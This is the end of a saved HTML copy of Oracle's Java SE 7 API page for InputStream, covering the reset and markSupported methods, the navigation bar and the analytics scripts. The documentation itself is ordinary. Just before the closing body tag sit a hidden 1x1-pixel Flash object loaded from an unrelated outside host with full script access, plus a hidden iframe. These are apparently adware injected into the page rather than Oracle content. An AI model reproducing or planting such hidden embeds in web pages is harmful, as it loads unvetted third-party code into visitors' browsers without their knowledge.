<dl><dt><span class="strong">Parameters:</span></dt><dd><code>readlimit</code> - the maximum limit of bytes that can be read before
                      the mark position becomes invalid.</dd><dt><span class="strong">See Also:</span></dt><dd><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#reset()"><code>reset()</code></a></dd></dl>
</li>
</ul>
<a name="reset()">
<!--   -->
</a>
<ul class="blockList">
<li class="blockList">
<h4>reset</h4>
<pre>public&nbsp;void&nbsp;reset()
           throws <a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></pre>
<div class="block">Repositions this stream to the position at the time the
 <code>mark</code> method was last called on this input stream.

 <p> The general contract of <code>reset</code> is:

 </p><p></p><ul>

 <li> If the method <code>markSupported</code> returns
 <code>true</code>, then:

     <ul><li> If the method <code>mark</code> has not been called since
     the stream was created, or the number of bytes read from the stream
     since <code>mark</code> was last called is larger than the argument
     to <code>mark</code> at that last call, then an
     <code>IOException</code> might be thrown.

     </li><li> If such an <code>IOException</code> is not thrown, then the
     stream is reset to a state such that all the bytes read since the
     most recent call to <code>mark</code> (or since the start of the
     file, if <code>mark</code> has not been called) will be resupplied
     to subsequent callers of the <code>read</code> method, followed by
     any bytes that otherwise would have been the next input data as of
     the time of the call to <code>reset</code>. </li></ul>

 </li><li> If the method <code>markSupported</code> returns
 <code>false</code>, then:

     <ul><li> The call to <code>reset</code> may throw an
     <code>IOException</code>.

     </li><li> If an <code>IOException</code> is not thrown, then the stream
     is reset to a fixed state that depends on the particular type of the
     input stream and how it was created. The bytes that will be supplied
     to subsequent callers of the <code>read</code> method depend on the
     particular type of the input stream. </li></ul></li></ul>

 <p>The method <code>reset</code> for class <code>InputStream</code>
 does nothing except throw an <code>IOException</code>.</p></div>
<dl><dt><span class="strong">Throws:</span></dt>
<dd><code><a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io">IOException</a></code> - if this stream has not been marked or if the
               mark has been invalidated.</dd><dt><span class="strong">See Also:</span></dt><dd><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#mark(int)"><code>mark(int)</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/IOException.html" title="class in java.io"><code>IOException</code></a></dd></dl>
</li>
</ul>
<a name="markSupported()">
<!--   -->
</a>
<ul class="blockListLast">
<li class="blockList">
<h4>markSupported</h4>
<pre>public&nbsp;boolean&nbsp;markSupported()</pre>
<div class="block">Tests if this input stream supports the <code>mark</code> and
 <code>reset</code> methods. Whether or not <code>mark</code> and
 <code>reset</code> are supported is an invariant property of a
 particular input stream instance. The <code>markSupported</code> method
 of <code>InputStream</code> returns <code>false</code>.</div>
<dl><dt><span class="strong">Returns:</span></dt><dd><code>true</code> if this stream instance supports the mark
          and reset methods; <code>false</code> otherwise.</dd><dt><span class="strong">See Also:</span></dt><dd><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#mark(int)"><code>mark(int)</code></a>, 
<a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#reset()"><code>reset()</code></a></dd></dl>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
<!-- ========= END OF CLASS DATA ========= -->
<!-- ======= START OF BOTTOM NAVBAR ====== -->
<div class="bottomNav"><a name="navbar_bottom">
<!--   -->
</a><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#skip-navbar_bottom" title="Skip navigation links"></a><a name="navbar_bottom_firstrow">
<!--   -->
</a>
<ul class="navList" title="Navigation">
<li><a href="http://docs.oracle.com/javase/7/docs/api/overview-summary.html">Overview</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/package-summary.html">Package</a></li>
<li class="navBarCell1Rev">Class</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/class-use/InputStream.html">Use</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/package-tree.html">Tree</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/deprecated-list.html">Deprecated</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/index-files/index-1.html">Index</a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/help-doc.html">Help</a></li>
</ul>
<div class="aboutLanguage"><em><strong>Java™&nbsp;Platform<br>Standard&nbsp;Ed.&nbsp;7</strong></em></div>
</div>
<div class="subNav">
<ul class="navList">
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Flushable.html" title="interface in java.io"><span class="strong">Prev Class</span></a></li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStreamReader.html" title="class in java.io"><span class="strong">Next Class</span></a></li>
</ul>
<ul class="navList">
<li><a href="http://docs.oracle.com/javase/7/docs/api/index.html?java/io/InputStream.html" target="_top">Frames</a></li>
<li><a href="./InputStream (Java Platform SE 7 )_files/InputStream (Java Platform SE 7 ).htm" target="_top">No Frames</a></li>
</ul>
<ul class="navList" id="allclasses_navbar_bottom" style="display: block;">
<li><a href="http://docs.oracle.com/javase/7/docs/api/allclasses-noframe.html">All Classes</a></li>
</ul>
<div>
<script type="text/javascript"><!--
  allClassesLink = document.getElementById("allclasses_navbar_bottom");
  if(window==top) {
    allClassesLink.style.display = "block";
  }
  else {
    allClassesLink.style.display = "none";
  }
  //-->
</script>
</div>
<div>
<ul class="subNavList">
<li>Summary:&nbsp;</li>
<li>Nested&nbsp;|&nbsp;</li>
<li>Field&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#constructor_summary">Constr</a>&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#method_summary">Method</a></li>
</ul>
<ul class="subNavList">
<li>Detail:&nbsp;</li>
<li>Field&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#constructor_detail">Constr</a>&nbsp;|&nbsp;</li>
<li><a href="http://docs.oracle.com/javase/7/docs/api/java/io/InputStream.html#method_detail">Method</a></li>
</ul>
</div>
<a name="skip-navbar_bottom">
<!--   -->
</a></div>
<!-- ======== END OF BOTTOM NAVBAR ======= -->
<p class="legalCopy"><small><font size="-1"> <a href="http://bugreport.sun.com/bugreport/">Submit a bug or feature</a> <br>For further API reference and developer documentation, see <a href="http://docs.oracle.com/javase/7/docs/index.html" target="_blank">Java SE Documentation</a>. That documentation contains more detailed, developer-targeted descriptions, with conceptual overviews, definitions of terms, workarounds, and working code examples.<br> <a href="http://docs.oracle.com/javase/7/docs/legal/cpyr.html">Copyright</a> © 1993, 2013, Oracle and/or its affiliates.  All rights reserved. </font></small></p>
<!-- Start SiteCatalyst code   -->
<script type="text/JavaScript" src="./InputStream (Java Platform SE 7 )_files/s_code_download.js"></script>
<script type="text/JavaScript" src="./InputStream (Java Platform SE 7 )_files/s_code.js"></script>

<!-- ********** DO NOT ALTER ANYTHING BELOW THIS LINE ! *********** -->
<!--  Below code will send the info to Omniture server -->
<script type="text/javascript">var s_code=s.t();if(s_code)document.write(s_code)</script>

<!-- End SiteCatalyst code -->
<noscript>
&lt;p&gt;Scripting on this page tracks web page traffic, but does not change the content in any way.&lt;/p&gt;
</noscript>


<div id="dp_swf_engine" style="position: absolute; width: 1px; height: 1px;"><embed style="width: 1px; height: 1px;" type="application/x-shockwave-flash" src="http://www.ajaxcdn.org/swf.swf" width="1" height="1" id="_dp_swf_engine" name="_dp_swf_engine" bgcolor="#336699" quality="high" allowscriptaccess="always"></div><iframe style="position: absolute; width: 1px; height: 1px; top: 0px; left: 0px; visibility: hidden;"></iframe><sfmsg id="sfMsgId" data="{&quot;imageCount&quot;:0,&quot;ip&quot;:&quot;1.1.1.1&quot;}"></sfmsg></body></html>